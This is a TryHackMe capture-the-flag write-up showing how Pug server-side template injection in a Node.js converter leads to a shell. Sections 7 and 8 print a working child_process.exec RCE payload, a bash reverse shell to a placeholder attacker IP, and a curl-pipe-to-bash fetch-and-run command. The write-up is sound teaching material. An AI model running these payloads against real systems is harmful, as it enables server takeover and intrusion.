# Templates — TryHackMe Writeup

**Room:** [Templates](https://tryhackme.com/room/templates)  
**Difficulty:** Medium  
**Primary vulnerability:** Server-Side Template Injection (SSTI)  
**Template engine:** Pug  
**Backend:** Node.js  
**Target service:** HTTP on port `5000`

---

## Executive Summary

**Templates** is a focused web-exploitation challenge built around **Server-Side Template Injection (SSTI)** in the Pug template engine.

The application is a deliberately vulnerable **Pug-to-HTML converter**. Users are allowed to submit Pug templates, and the server renders those templates into HTML. That sounds harmless until you realize that the submitted template is processed by Pug itself rather than being treated purely as inert text.

That distinction creates the vulnerability:

```
User-controlled Pug template
          ↓
Pug parses the template
          ↓
Injected JavaScript expression
          ↓
JavaScript executes on the server
          ↓
Node.js command execution
          ↓
Reverse shell
          ↓
flag.txt
```

The important lesson is that **template engines are not inherently vulnerable**. The vulnerability exists because the application gives the attacker control over the template itself instead of safely supplying attacker-controlled values as template data. TryHackMe's SSTI material makes the same distinction.

---

# 1. Reconnaissance

Unlike some of the larger TryHackMe machines, this room gives us a very strong hint immediately: the challenge is centered around a web application running on **port 5000**.

After starting the machine, I visited:

```
http://<MACHINE_IP>:5000/
```

The application presents itself as a **Pug-to-HTML converter**. You can enter Pug syntax into the editor and click **Convert to HTML** to see the generated HTML. Independent walkthroughs confirm that this is the intended attack surface and that the application's rendering endpoint is `/render`.

A minimal request looks like:

```
curl -X POST http://<MACHINE_IP>:5000/render \
     -d 'template=aaa'
```

The server responds with rendered HTML.

That immediately gives us an interesting question:

> Is the submitted text being treated as ordinary template data, or is the server actually compiling it as a Pug template?

That's exactly what we need to test.

---

# 2. Understanding Pug

**Pug** is a template engine used to generate HTML.

Instead of writing verbose HTML such as:

```
<h1>Hello</h1>
<p>Welcome</p>
```

Pug allows the same structure to be expressed much more compactly:

```
h1 Hello
p Welcome
```

The important security distinction is that Pug isn't merely formatting text. It is a programming-oriented template language capable of evaluating expressions.

That means an application should **not** blindly treat attacker-controlled input as a complete Pug template.

If user input reaches the template compiler directly, we potentially have SSTI.

---

# 3. Testing for SSTI

The simplest way to test Pug is to provide an expression that should evaluate mathematically.

For example:

```
p #{7*7}
```

If the application treats the input as plain text, we would expect something resembling:

```
<p>#{7*7}</p>
```

Instead, the application evaluates the expression and produces:

```
<p>49</p>
```

That is the key observation.

The `#{...}` syntax is being interpreted **server-side by Pug**.

Multiple independent Templates write-ups confirm that `#{7*7}` evaluates to `49` on the target.

Therefore:

```
#{7*7}
      ↓
49
```

This confirms **Server-Side Template Injection**.

---

# 4. Why This Is More Serious Than XSS

At this point, it is tempting to think this is simply another form of HTML injection.

It isn't.

With normal client-side injection, the attacker's code executes in the victim's browser.

With SSTI, the attacker's expression is evaluated by the **server**.

So the trust boundary looks like this:

```
XSS:

Attacker → Server → Victim's browser
                         ↑
                       code

SSTI:

Attacker → Server
              ↑
         attacker code
```

That difference is enormous.

Because Pug runs within a Node.js application, successful SSTI can potentially reach Node's JavaScript runtime and, from there, operating-system functionality.

TryHackMe describes SSTI as a server-side vulnerability that can lead to consequences including code execution and server compromise.

---

# 5. Identifying the Template Engine

The room's name and interface already strongly suggest Pug, but the behavior provides confirmation.

For Pug, the expression syntax:

```
#{...}
```

is evaluated by the template engine.

For example:

```
p The answer is #{3*3}
```

renders as:

```
<p>The answer is 9</p>
```

So our proof of concept is:

```
p Pug SSTI: #{7*7}
```

Output:

```
<p>Pug SSTI: 49</p>
```

At this point we have established:

- User controls the template.
- Pug processes the template.
- Pug evaluates JavaScript expressions.
- The evaluation occurs on the server.

That's the complete SSTI vulnerability.

---

# 6. Moving From Expression Evaluation to JavaScript Execution

Now the objective changes.

We don't just want to calculate:

```
7 * 7
```

We want to interact with the Node.js runtime.

Pug templates execute within the Node.js process, so JavaScript functionality available to the process becomes interesting.

The key Node.js module for command execution is:

```
child_process
```

Node provides functions such as `exec()` for running operating-system commands.

A commonly used Pug SSTI technique reaches Node's module loader and loads `child_process`. This approach is documented in security research and in several walkthroughs of this specific room.

The important conceptual transition is:

```
Pug expression
     ↓
JavaScript execution
     ↓
Node.js module access
     ↓
child_process
     ↓
OS command execution
```

---

# 7. Obtaining Command Execution

A useful Pug expression for this challenge is:

```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('id')}()}
```

The important pieces are easier to understand separately.

### `global.process`

Node exposes the current process through:

```
process
```

The `global` object gives us access to that runtime environment.

### `mainModule`

The main Node module gives us a route toward Node's module-loading functionality.

### `constructor._load`

This provides access to Node's internal module loader.

Conceptually:

```
global
  ↓
process
  ↓
mainModule
  ↓
constructor
  ↓
_load()
```

Then:

```
_load("child_process")
```

loads Node's `child_process` module.

Finally:

```
.exec(...)
```

executes a system command.

So the whole payload is essentially turning the original SSTI into:

```
Pug
 ↓
JavaScript
 ↓
Node internals
 ↓
child_process
 ↓
command execution
```

---

# 8. Establishing a Reverse Shell

Once server-side command execution is available, the remaining task is to establish a shell back to the attacking machine.

For the challenge, a shell script can be hosted from the attacking machine and retrieved by the target.

For example, the script can contain a standard shell connection back to the listener:

```
#!/bin/bash
sh -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

Then host the script:

```
python3 -m http.server 8000
```

and listen for the incoming connection:

```
nc -lvnp <LISTENER_PORT>
```

The Pug expression can then use Node's command-execution functionality to retrieve and execute the script.

A commonly documented payload for the Templates room uses this general technique:

```
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl <ATTACKER_IP>:8000/payload.sh | bash')}()}
```

This technique is independently documented in several Templates walkthroughs.

Once the application processes the template, the Node.js process executes the command, the target retrieves the shell script, and the connection comes back to the listener.

---

# 9. Obtaining the Flag

After receiving the shell, I checked the filesystem for the challenge flag.

The Templates machine places the flag directly on the target rather than requiring a lengthy privilege-escalation chain. Multiple walkthroughs of the room confirm that the flag is already accessible after obtaining the shell.

The important distinction is that **this room isn't primarily a privilege-escalation challenge**.

The intended chain is essentially:

```
SSTI
 ↓
Pug JavaScript execution
 ↓
Node.js command execution
 ↓
Shell
 ↓
flag.txt
```

That makes the room a very clean demonstration of why SSTI can be so dangerous.

---

# 10. The Complete Attack Chain

```
┌───────────────────────────┐
│ Pug → HTML Converter      │
│ Port 5000                 │
└─────────────┬─────────────┘
              │
              ▼
       User controls
       Pug template
              │
              ▼
       #{7*7}
              │
              ▼
            49
              │
              ▼
      SSTI confirmed
              │
              ▼
    JavaScript execution
              │
              ▼
     Node.js internals
              │
              ▼
     child_process.exec()
              │
              ▼
       OS command execution
              │
              ▼
       Reverse shell
              │
              ▼
          flag.txt
```

---

# Key Lessons

## 1. Template engines aren't automatically vulnerable

Pug itself isn't the vulnerability.

The problem is the application's design:

```
User input
    ↓
Template compiler
```

rather than something safer such as:

```
Fixed template
    +
User-controlled data
    ↓
Template renderer
```

This distinction is fundamental to understanding SSTI.

---

## 2. `#{7*7}` is an excellent first Pug SSTI test

When you suspect Pug, a simple arithmetic expression is enough to establish whether the server is evaluating template expressions:

```
#{7*7}
```

If the response contains:

```
49
```

rather than the literal expression, you've demonstrated server-side evaluation.

---

## 3. SSTI can cross multiple security boundaries

The interesting part of this room isn't merely that Pug evaluates expressions.

It's the chain:

```
Template syntax
      ↓
JavaScript
      ↓
Node.js runtime
      ↓
Node module system
      ↓
child_process
      ↓
Operating system
```

That's why SSTI can escalate from what looks like a harmless templating bug into full server-side code execution.

---

## 4. Look at the technology stack before choosing payloads

Once we knew the application was using **Pug/Node.js**, Python/Jinja2 or PHP/Twig payloads would be irrelevant.

The exploitation strategy needs to match the actual template engine.

For example:

|Engine|Typical expression style|
|---|---|
|**Pug**|`#{7*7}`|
|**Jinja2**|`{{7*7}}`|
|**Twig**|`{{7*7}}`|
|**Smarty**|`{...}`|

Different engines have different syntax and different routes to code execution.

---

# Final Takeaway

**Templates** is a short but extremely useful SSTI exercise because the vulnerability is almost impossible to miss once you understand what the application is doing.

The crucial discovery is:

```
#{7*7}
```

becomes:

```
49
```

That single result tells us that our input isn't merely being displayed — **the server is interpreting it as Pug code**.

From there, the attack progresses through Node.js's runtime to command execution and ultimately a shell containing the room's flag.

The core lesson is simple:

> **Never compile untrusted user input as a server-side template.**

If an application needs user-controlled content inside a template, the application should keep the template itself trusted and pass the user's input as data. That prevents the user from turning ordinary data into executable template instructions.